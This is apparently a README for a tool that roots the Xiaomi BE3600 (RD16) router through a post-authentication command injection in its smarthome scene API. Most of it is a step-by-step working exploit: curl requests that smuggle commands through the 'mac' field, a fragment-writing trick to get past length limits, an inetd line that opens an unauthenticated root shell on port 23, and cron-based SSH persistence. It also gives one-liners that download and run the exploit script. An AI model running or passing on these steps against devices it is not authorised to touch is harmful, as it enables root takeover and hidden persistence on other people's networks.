# Xiaomi BE3600 (RD16) — SmartHome Scene Command Injection → Root Shell / SSH

> Verified device: **Xiaomi BE3600 router (internal model RD16, CN)**
> Verified firmware: **MIUI ROM 1.0.41 release** (built 2025-04-01, Qualcomm IPQ5312 / ARMv7 / OpenWrt 18.06 / busybox 1.36.1)
> Vulnerability type: **post-auth command injection** (requires the web admin password)
> Impact: full root shell plus persistent SSH
>
> 中文文档：[README.md](README.md)

## Main path

```
web admin password
    │
    ▼
POST api/xqsystem/login ─────────────────────► stok token
    │
    ▼
POST api/xqsmarthome/request_smartcontroller
  scene_setting: wan_block action mac field contains \n
    │   smartcontroller splices mac unsanitized into
    │   system("/usr/sbin/sysapi macfilter set mac=%s wan=%s;... commit")
    ▼
scene_start ──► injected command runs as root (≤18 chars each)
    │
    ▼
append-fragment writer (echo -n FF>>/tmp/x + cat /tmp/0>>/tmp/x)
    │   every injected command <=18 chars, no length cap
    ▼
inetd.conf + /usr/sbin/inetd ──► :23 temporary root /bin/sh (debug only)
    │
    ▼
/data + /etc/crontabs (sec_cfg) ──► per-minute self-heal watchdog
dropbear -s + authorized_keys ──► :22 SSH (key auth only)
persist verifies a real SSH login ──► removes inetd + the debug shell
```

- **Post-auth RCE**: the admin password is required to reach the injection endpoint; this is not an unauthenticated RCE
- Every legacy injection point used by XMiR-Patcher (`start_binding` etc.) is patched in 1.0.41; `wan_block` is the only live injection surface confirmed on this firmware
- `/etc` is ramfs (rebuilt at boot); only `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) persist
- The `:23` unauthenticated shell is a debug path only — `persist` kills inetd once SSH answers; the watchdog only resurrects dropbear

## Measured constraints

| Constraint | Detail |
|---|---|
| Command length | ≤18 chars per injected command (fortify `snprintf` bound) |
| Banned chars | `' " ; | $ &` backtick `\`; real newline via double-JSON `\\n` |
| Scene shape | one action per scene (multi-action scenes crash the daemon) |
| Long-lived procs | `system()` waits on pipe EOF — daemons must go through a file or procd, never run directly |
| Digit-ending frags | `echo -n ..D>/tmp/N` (D a digit) becomes an `D>` fd redirect writing nothing — pad with ` >` |
| Writable areas | `/etc` ramfs wiped on boot; `/data`, `/etc/crontabs`, `/etc/config` persist |

## One-liner (no clone, fully automatic)

macOS / Linux (needs `python3` + `curl`):

```bash
curl -fsSLo /tmp/rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py && python3 /tmp/rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist --pubkey 'ssh-rsa AAAA...your public key'
```

Windows PowerShell (replace `python` with `py` if needed):

```powershell
irm -OutFile $env:TEMP\rd16.py https://raw.githubusercontent.com/ChiphaLo/xiaomi-be3600-rd16-ssh/main/exploit.py; python $env:TEMP\rd16.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist --pubkey 'ssh-rsa AAAA...your public key'
```

- `--stage persist` does everything: injection → temporary inetd (:23) → install key + dropbear (:22, `-s` key-only) → **verify a real SSH login** → remove inetd → `/data` + cron watchdog
- `--pubkey` is **required**: SSH accepts keys only; password auth is off (no `-B` blank-password flag)
- optional `--privkey <path>` performs a **bidirectional** check: privkey↔pubkey match + real login against a known_hosts built from the device's host key; without it, manual confirmation (only a bare Enter counts)
- optional `--allow-cidr 192.168.31.0/24` restricts :22 via a dedicated `RD16_SSH` chain (new chain first, top-pinned jump, old chain deleted last — no window; IPv4 only)
- omit `--password` for an interactive prompt so the password stays out of shell history and the process list
- debug shell only: swap `--stage persist` for `--stage shell`, then `nc 192.168.31.1 23` (gone after reboot, nothing persisted)

## Quick start (exploit.py)

```bash
git clone https://github.com/ChiphaLo/xiaomi-be3600-rd16-ssh.git && cd xiaomi-be3600-rd16-ssh

python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage shell
# then: nc <router-ip> 23  ->  root /bin/sh (temporary debug)

python3 exploit.py --ip 192.168.31.1 --password 'YOUR_ADMIN_PASSWORD' --stage persist \
    --pubkey 'ssh-rsa AAAA...your public key'
# SSH (:22, key-only) survives reboots; :23 debug shell removed once verified
```

Stdlib only; performs login → injection → inetd → optional persistence.

## Append-fragment technique

Every injected command is ≤18 chars and appends directly to the target file — no length cap, and no assembly step that could itself overflow the bound:

```sh
rm -f /tmp/x
echo -n FF>>/tmp/x    # non-space frags (<=2 chars) append directly
echo -n A B>/tmp/0    # a space inside a 3-char group -> scratch file
cat /tmp/0>>/tmp/x    #   then append (the space comes from argv splitting)
echo -n D >>/tmp/x    # all-digit frags need ' >>' or 'D>>' is an fd redirect
echo A D >>/tmp/x     # line-final frags use plain echo for the newline
sh /tmp/x
```

- no single-char namespace limit: `/tmp/0` is reused, one output file receives everything
- `space+digit` mid-line has no legal emission — the writer rejects it explicitly; `>` cannot appear inside content
- `run_cmd()` hard-checks every injected command for length and banned characters

## Full manual walkthrough

Same as what `exploit.py` automates — every step independently verifiable.

### 0. Prerequisites

- Computer on the same LAN, `http://<AP_IP>/cgi-bin/luci` reachable
- Web admin password

### 1. Login for token

```bash
TOK=$(curl -s -X POST 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/login' \
    --data-urlencode 'username=admin' \
    --data-urlencode 'password=PASSWORD' \
    --data-urlencode 'logtype=2' \
    | grep -o '"token":"[^"]*"' | cut -d'"' -f4)
```

> URL-encode each field — `&`, `+` etc. inside the password break a raw `--data` body. Don't pass the whole body through a single `--data-urlencode`; that encodes the `&` separators too.

### 2. Command channel: scene + wan_block

```bash
curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_setting","id":0,"name":"x","launch":{"mode":"home"},"action_list":[{"thirdParty":"xmrouter","type":"wan_block","delay":0,"payload":"{\"command\": \"wan_block\", \"mac\": \"AA\nid>/tmp/messages\n\"}"}]}'
# -> {"code":0,"id":<sid>}

curl -s -X POST \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/xqsmarthome/request_smartcontroller" \
  --data-urlencode 'payload={"command":"scene_start","id":<sid>}'
```

`mac` is `AA\n<CMD>\n`; the injected line runs in parallel with the `macfilter commit` tail.

Note: every `scene_setting` persists a scene record into `/etc/smartcontroller/SmartTask.sc` (sec_cfg partition, ~6 MB) — **always `scene_delete` it afterwards** (exploit.py does this automatically after `scene_start`). Leftovers from older runs can be wiped with `{"command":"reset_scenes"}` (removes ALL scenes on the device).

### 3. Read-back channel

`/tmp/messages` ships inside the syslog tarball — copy any file there via the same channel, then download:

```bash
F=$(curl -s "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/sys_log" \
    | grep -o '"file":"[^"]*"' | cut -d'"' -f4)
curl -s -o sl.tar.gz \
  "http://192.168.31.1/cgi-bin/luci/;stok=$TOK/api/misystem/c_download/$F"
tar -xzf sl.tar.gz -C sl && head sl/tmp/messages
```

The tarball also carries `stat/system-02-ps.txt`, `stat/hardware-01-bdata.txt`, `stat/firewall-01-iptable.txt` — live process/nvram/iptables dumps.

### 4. Long scripts via append fragments

Each scene action only fits ≤18 chars — slice the script and **append** piece by piece:

```sh
rm -f /tmp/x                            # start clean
echo -n cp>>/tmp/x                      # <=2-char frags append directly
echo -n A B>/tmp/0                      # 3-char group with a space -> scratch
cat /tmp/0>>/tmp/x                      #   then append
echo -n D >>/tmp/x                      # all-digit frags must use ' >>'
sh /tmp/x                               # run
```

Space frags: `echo -n A B>/tmp/0` yields `"A B"` (A and B each a single non-digit char), then `cat /tmp/0>>/tmp/x`.
Every injected command stays ≤18 chars — script length is unbounded.

### 5. Temporary shell via inetd (debug only)

Bare `telnetd` exits on the `nvram get telnet_en` / `bdata get telnet_en` check; the official `set_telnet` API is gated by `apps.telnet`. inetd does not check:

```sh
# script content (written via fragments)
cp /tmp/ii /etc/inetd.conf
inetd
```

`/tmp/ii` = `23 stream tcp nowait root /bin/sh sh`. Then `nc <ip> 23` → unauthenticated root shell. **Debug channel only — it dies with the ramfs on reboot, must not go into persistence, and gets closed in step 7 once SSH answers.**

### 6. SSH: key-only dropbear

```sh
rm /etc/dropbear/dropbear_rsa_host_key       # 0-byte placeholder must go first
dropbearkey -t rsa -f /data/dropbear_rsa_host_key   # ~1 min, lands on /data (persistent)
echo 'your ssh-rsa pubkey' > /data/authorized_keys   # land on /data (persistent)
mkdir -p /etc/dropbear
cp /data/authorized_keys /etc/dropbear/authorized_keys
/usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key   # -s disables password auth
```

`ssh -i <privkey> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip>` works (stock dropbear offers ssh-rsa only — OpenSSH ≥8.8 rejects it by default, so opt back in). **Never pass `-B`** (blank-password logins). If you really want password auth, root's hash must use `$1$` md5 — this firmware's musl lacks `$6$` SHA-512 crypt.

### 7. Persistence (watchdog owns dropbear only)

`/etc` is ramfs (rebuilt from squashfs at boot), but `/data` (UBIFS) and `/etc/crontabs` (sec_cfg ext4) survive. `/data/persist.sh`:

```sh
#!/bin/sh
mkdir -p /etc/dropbear
cmp -s /data/authorized_keys /etc/dropbear/authorized_keys || \
    cp /data/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null
for p in $(pidof dropbear); do
    grep -q dropbear_rsa_host_key /proc/$p/cmdline && { rm -f /tmp/rd16_df; exit 0; }
done
/usr/sbin/dropbear -s -r /data/dropbear_rsa_host_key && { rm -f /tmp/rd16_df; exit 0; }
[ -f /tmp/rd16_df ] || { logger -t rd16 'dropbear start failed'; touch /tmp/rd16_df; }
exit 0
```

Append to `/etc/crontabs/root` (persistent via sec_cfg):

```
* * * * * sh /data/persist.sh >/dev/null 2>&1
```

Finishing steps — first confirm a real login (`ssh -i <privkey> -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<ip> id` returns `uid=0`); only **after that succeeds** close the debug shell (a banner alone proves nothing):

```sh
for p in $(pidof inetd); do kill $p; done
rm -f /etc/inetd.conf
```

Optional: restrict SSH to the management subnet (dedicated chain + top-pinned jump + windowless swap; fold into persist.sh so it self-heals):

```sh
iptables -N RD16_NEW 2>/dev/null; iptables -F RD16_NEW
iptables -A RD16_NEW -s 192.168.31.0/24 -j ACCEPT
iptables -A RD16_NEW -j DROP
iptables -D INPUT -p tcp --dport 22 -j RD16_NEW 2>/dev/null
iptables -D INPUT -p tcp --dport 22 -j RD16_SSH 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 22 -j RD16_NEW
iptables -F RD16_SSH 2>/dev/null; iptables -X RD16_SSH 2>/dev/null
iptables -E RD16_NEW RD16_SSH 2>/dev/null
```

After reboot, dropbear returns within ~1 minute — inetd does not. The watchdog runs every minute: `cmp -s` means authorized_keys is only rewritten when it actually changed, and a failed dropbear start is logged once per outage (`/tmp/rd16_df` flag), not once per minute.

## Files

- `exploit.py` — single-file tool (stdlib only): login → inject → inetd → optional persistence
- `tests/test_exploit.py` — offline unit tests (stdlib only): writer replay, length/charset guards, input validation
- `docs/TECHNICAL_EN.md` — injection-point disassembly, limit derivation, fd-redirect pitfall, alternate channels
- `docs/TECHNICAL.md` — 中文技术细节
- `README.md` — 中文说明

## Disclaimer

Only use on devices you own or are authorized to test. This is a **post-auth** bug (requires the admin password), not an unauthenticated RCE; if you find an unauthenticated variant of the same sink, use vendor-coordinated disclosure.

## License

MIT
